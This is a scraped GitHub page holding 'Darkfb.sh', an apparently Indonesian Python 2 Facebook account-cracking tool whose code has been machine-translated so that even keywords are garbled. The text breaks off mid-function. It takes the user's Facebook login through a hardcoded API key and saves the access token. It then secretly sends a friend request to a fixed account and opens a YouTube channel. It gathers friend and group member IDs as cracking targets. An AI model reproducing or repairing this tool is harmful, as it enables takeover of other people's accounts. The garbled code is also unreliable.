
Lewati ke konten
bang-Habib
/
Darkfb.sh
Kode
Masalah
Tarik permintaan
tindakan
Proyek
Wiki
Keamanan
Wawasan
Darkfb.sh/ Darkfb.sh
@bang-Habib
bang-Habib Add files via upload
 1 kontributor
877 baris (830 sloc)  32.4 KB
#!/usr/bin/python2
# pengkodean=utf-8


impor  os , sys , waktu , datetime , acak , hashlib , re , threading , json , urllib , cookielib , permintaan , mekanisasi
dari  multiproses . kolam  impor  ThreadPool
dari  permintaan . pengecualian  impor  ConnectionError
dari  browser impor mekanis  


isi ulang ( sys )
sys . setdefaultencoding ( 'utf8' )
br  =  mekanisasi . Peramban ()
br . set_handle_robots ( Salah )
br . set_handle_refresh ( mekanisasi . _http . HTTPRefreshProcessor (), max_time = 1 )
br . addheaders  = [( 'User-Agent' , 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Versi/12.16' )]


def  Keluar ():
	print  " \033 [1;96m[!] \x1b [1;91mKeluar"
	os . sys . keluar ()
	
	
pasti  acak ( x ):
    w  =  'mhkbpcP'
    t  =  ''
    untuk  saya  di  x :
        d  +=  '!' + w [ acak . randint ( 0 , len ( w ) - 1 )] + i
    kembali  cetak ( d )
    
    
def  cetak ( x ):
    w  =  'mhkbpcP'
    untuk  saya  di  w :
        j  =  w . indeks ( saya )
        x =  x . ganti ( '!%s' % i , ' \033 [%s;1m' % str ( 31 + j ))
    x  +=  ' \033 [0m'
    x  =  x . ganti ( '!0' , ' \033 [0m' )
    sys . stdout . tulis ( x + ' \n ' )
	

def  jalan ( z ):
	untuk  e  dalam  z  +  ' \n ' :
		sys . stdout . write ( e )
		sys . stdout . menyiram ()
		waktu . tidur ( 0,05 )
		
		
logo  =  """   \x1b [1;93m______    \x1b [1;92m_______   \x1b [1;94m______     \x1b [1;91m___ _ \n  \x1b [1;93m| | \x1b [1;92m| _ | \ x1b [1;94m| _ |   \x1b [1;91m| | | | \n  \x1b [1;93m| _ | \x1b [1;92m| |_| | \x1b [1;94m| | ||   \x1b [1;91m| |_| | \n  \x1b [1;93m| | | | \x1b [1;92m| | \x1b [1;94m| |_||_ \x1b [1;91m| _| \n  \x1b[1,93m| |_| | \x1b [1;92m| | \x1b [1;94m| __ | \x1b [1;91m| |_ \n  \x1b [1;93m| | \x1b [1;92m| _ | \x1b [1;94m| | | | \x1b [1;91m| _ | \n  \x1b [1;93m|______| \x1b [1;92m|__| |__| \x1b [1;94m|___| |_| \x1b [1;91m|___| |_| \x1b [1;96mFB \n \n  \x1b [1;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ▬▬▬▬▬▬ ● \ n ✫╬─ \ x1b [1; 92mAUTHOR \ x1b [1; 91m: \ x1b[1;93mKrisna ft HABIB                    \x1b [1;95m─╬✫ \n ✫╬─ \x1b [1;92mWhatsApp     \x1b [1;92m \x1b [1;91m: \x1b [1;96m+62 895-6224] -13472 - +62 857-9889-8387      \x1b [1;95m─╬✫ \n ✫╬─ \x1b [1;92mTEAM \x1b [1;91m: \x1b [1;94mTEAM SQUOT BADUT      \x1b [1; 95m─╬✫ \n ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
"""

def  tik ():
	titik  = [ '. ' , '.. ' , '... ' ]
	untuk  o  di  titik :
		print ( " \r \033 [1;96m[●] \x1b [1;93mSedang masuk \x1b [1;97m" + o ),; sys . stdout . menyiram (); waktu . tidur ( 1 )


kembali  =  0
benang  = []
berhasil  = []
titik cek  = []
oke  = []
identitas  = []
daftar grup  = []
vulnot  =  " \033 [31mBukan Vuln"
vuln  =  " \033 [32mVuln"

def  siapa ():
	os . sistem ( 'jelas' )
	nama  =  raw_input ( " \033 [1;97mSiapa nama kamu ? \033 [1;91m: \033 [1;92m" )
	jika  nama  == "" :
		print " \033 [1;96m[!] \033 [1;91mIsi yang benar"
		waktu . tidur ( 1 )
		siapa ()
	lain :
		os . sistem ( 'jelas' )
		jalan ( " \033 [1;97mSelamatdatang \033 [1;92m"  + nama +  " \n \033 [1;97mTerimakasih telah menggunakan kontol ini !!" )
		waktu . tidur ( 1 )
		masukSC ()
		
		
def  loginSC ():
	os . sistem ( 'jelas' )
	print " \033 [1;97mSilahkan login SC nya dulu tol \n "
	nama pengguna  =  raw_input ( " \033 [1;96m[*] \033 [1;97mNama Pengguna \033 [1;91m: \033 [1;92m" )
	kata sandi  =  raw_input ( " \033 [1;96m[*] \033 [1;97mPassword \033 [1;91m: \033 [1;92m" )
	jika  username  == "Krisna"  dan  password  == "Habib" :
		print " \033 [1;96m[✓] \033 [1;92mLogin berhasil"
		waktu . tidur ( 1 )
		masuk ()
	lain :
		print " \033 [1;96m[!] \033 [1;91mSalah!!"
		waktu . tidur ( 1 )
                MasukSC ()

def  masuk ():
	os . sistem ( 'jelas' )
	coba :
		toket  =  buka ( 'login.txt' , 'r' )
		menu ()
	kecuali ( KeyError , IOError ):
		os . sistem ( 'jelas' )
		cetak  logo
		cetak  42 * " \033 [1;96m="
		print ( ' \033 [1;96m[☆] \x1b [1;93mLOGIN AKUN FACEBOOK ANDA \x1b [1;96m[☆]' )
		id  =  raw_input ( ' \033 [1;96m[+] \x1b [1;93mID/Email \x1b [1;91m: \x1b [1;92m' )
		pwd  =  raw_input ( ' \033 [1;96m[+] \x1b [1;93mPassword \x1b [1;91m: \x1b [1;92m' )
		tik ()
		coba :
			br . buka ( 'https://m.facebook.com' )
		kecuali  mekanisasi . URLKesalahan :
			print " \n \033 [1;96m[!] \x1b [1;91mTidak ada koneksi"
			keluar ()
		br . _pabrik . is_html  =  Benar
		br . pilih_form ( nr = 0 )
		br . formulir [ 'email' ] =  id
		br . bentuk [ 'lulus' ] =  pwd
		br . kirim ()
		url  =  br . geturl ()
		jika  'simpan-perangkat'  di  url :
			coba :
				sig =  'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return'
				Data  = { "api_key" : "882a8490361da98702bf97a021ddc14d" , "credentials_type" : "password" , "email" : id , "format" : "JSON" , "generate_machine_id" : "1" , "generate_session_cookies" : "1" , " locale" : "en_US" , "method" : "auth.login" , "password" : pwd , "return_ssl_resources" : "0" , "v" : "1.0"}
				x = hashlib . baru ( "md5" )
				x . memperbarui ( sg )
				a = x . hexdigest ()
				data . pembaruan ({ 'sig' : a })
				url  =  "https://api.facebook.com/restserver.php"
				r = permintaan . dapatkan ( url , params = data )
				z = json . beban ( r . teks )
				unikers  =  buka ( "login.txt" , 'w' )
				unik . tulis ( z [ 'akses_token' ])
				unik . tutup ()
				print  ' \n \033 [1;96m[✓] \x1b [1;92mLogin Berhasil'
				permintaan . posting ( 'https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z [ 'access_token' ])
				os . sistem ( 'xdg-open https://www.youtube.com/omaliptv' )
				menu ()
			kecuali  permintaan . pengecualian . Kesalahan Koneksi :
				print " \n \033 [1;96m[!] \x1b [1;91mTidak ada koneksi"
				keluar ()
		jika  'pos pemeriksaan'  di  url :
			print ( " \n \033 [1;96m[!] \x1b [1;91mSepertinya akun anda kena checkpoint" )
			os . sistem ( 'rm -rf login.txt' )
			waktu . tidur ( 1 )
			keluar ()
		lain :
			print ( " \n \033 [1;96m[!] \x1b [1;91mPassword/Email salah" )
			os . sistem ( 'rm -rf login.txt' )
			waktu . tidur ( 1 )
			masuk ()
			
			
 menu def ():
	os . sistem ( 'jelas' )
	coba :
		toket = buka ( 'login.txt' , 'r' ). baca ()
	kecuali  IOError :
		os . sistem ( 'jelas' )
		print " \033 [1;96m[!] \x1b [1;91mToken tidak valid"
		os . sistem ( 'rm -rf login.txt' )
		waktu . tidur ( 1 )
		keluar ()
	coba :
		otw  =  permintaan . dapatkan ( 'https://graph.facebook.com/me?access_token=' + toket )
		a  =  json . beban ( otw . teks )
		nama  =  a [ 'nama' ]
		id  =  a [ 'id' ]
	kecuali  KeyError :
		os . sistem ( 'jelas' )
		print " \033 [1;96m[!] \033 [1;91mToken tidak valid"
		os . sistem ( 'rm -rf login.txt' )
		waktu . tidur ( 1 )
		masuk ()
	kecuali  permintaan . pengecualian . Kesalahan Koneksi :
		print " \033 [1;96m[!] \x1b [1;91mTidak ada koneksi"
		keluar ()
	os . sistem ( "jelas" )
	cetak  logo
	cetak  42 * " \033 [1;96m="
	print  " \033 [1;96m[ \033 [1;97m✓ \033 [1;96m] \033 [1;93m Nama \033 [1;91m: \033 [1;92m" + nama + " \033] [1;97m "
	print  " \033 [1;96m[ \033 [1;97m✓ \033 [1;96m] \033 [1;93m ID    \033 [1;91m: \033 [1;92m" + id + " \x1b] [1;97m "
	cetak  42 * " \033 [1;96m="
	print  " \x1b [1;97m1. \x1b [1;93m Hack facebook MBF"
	print  " \x1b [1;97m2. \x1b [1;93m Lihat daftar grup "
	print  " \x1b [1;97m3. \x1b [1;93m Informasi akun "
	print  " \x1b [1;97m4. \x1b [1;93m Yahoo clone "
	print  " \n \x1b [1;91m0. \x1b [1;91m Logout "
	pilih ()


pasti  pilih ():
	unikers  =  raw_input ( " \n \033 [1;97m >>> \033 [1;97m" )
	jika  unikers  == "" :
		print  " \033 [1;96m[!] \x1b [1;91mIsi yang benar"
		pilih ()
	elif  unikers  == "1" :
		super ()
	elif  unikers  == "2" :
		grupsaya ()
	elif  unikers  == "3" :
		informasi ()
	elif  unikers  == "4" :
		yahoo ()
	elif  unikers  == "0" :
		os . sistem ( 'jelas' )
		jalan ( 'Menghapus token' )
		os . sistem ( 'rm -rf login.txt' )
		keluar ()
	lain :
		print  " \033 [1;96m[!] \x1b [1;91mIsi yang benar"
		pilih ()
		
		
def  super ():
	 toket global
	os . sistem ( 'jelas' )
	coba :
		toket = buka ( 'login.txt' , 'r' ). baca ()
	kecuali  IOError :
		print " \033 [1;96m[!] \x1b [1;91mToken tidak valid"
		os . sistem ( 'rm -rf login.txt' )
		waktu . tidur ( 1 )
		keluar ()
	os . sistem ( 'jelas' )
	cetak  logo
	cetak  42 * " \033 [1;96m="
	print  " \x1b [1;97m1. \x1b [1;93m Crack dari daftar teman"
	print  " \x1b [1;97m2. \x1b [1;93m Crack dari teman"
	print  " \x1b [1;97m3. \x1b [1;93m Crack dari member grup"
	print  " \x1b [1;97m4. \x1b [1;93m Crack dari file"
	print  " \n \x1b [1;91m0. \x1b [1;91m Kembali"
	pilih_super ()

def  pilih_super ():
	peak  =  raw_input ( " \n \033 [1;97m >>> \033 [1;97m" )
	jika  puncak  == "" :
		print  " \033 [1;96m[!] \x1b [1;91mIsi yang benar"
		pilih_super ()
	 puncak  elif == "1" :
		os . sistem ( 'jelas' )
		cetak  logo
		cetak  42 * " \033 [1;96m="
		jalan ( ' \033 [1;96m[✺] \033 [1;93mMengambil ID \033 [1;97m...' )
		r  =  permintaan . dapatkan ( "https://graph.facebook.com/me/friends?access_token=" + toket )
		z  =  json . beban ( r . teks )
		untuk  s  dalam  z [ 'data' ]:
			id . tambahkan ( s [ 'id' ])
	 puncak  elif == "2" :
		os . sistem ( 'jelas' )
		cetak  logo
		cetak  42 * " \033 [1;96m="
		idt  =  raw_input ( " \033 [1;96m[+] \033 [1;93mMasukan ID teman \033 [1;91m: \033 [1;97m" )
		coba :
			lelucon  =  permintaan . dapatkan ( "https://graph.facebook.com/" + idt + "?access_token=" + toket )
			op  =  json . beban ( lelucon . teks )
			print " \033 [1;96m[ \033 [1;97m✓ \033 [1;96m] \033 [1;93mNama teman \033 [1;91m : \033 [1;97m " + op [ "nama"" ]
		kecuali  KeyError :
			print " \033 [1;96m[!] \x1b [1;91mTeman tidak ditemukan!"
			raw_input ( " \n \033 [1;96m[ \033 [1;97mKembali \033 [1;96m]" )
			super ()
		jalan ( ' \033 [1;96m[✺] \033 [1
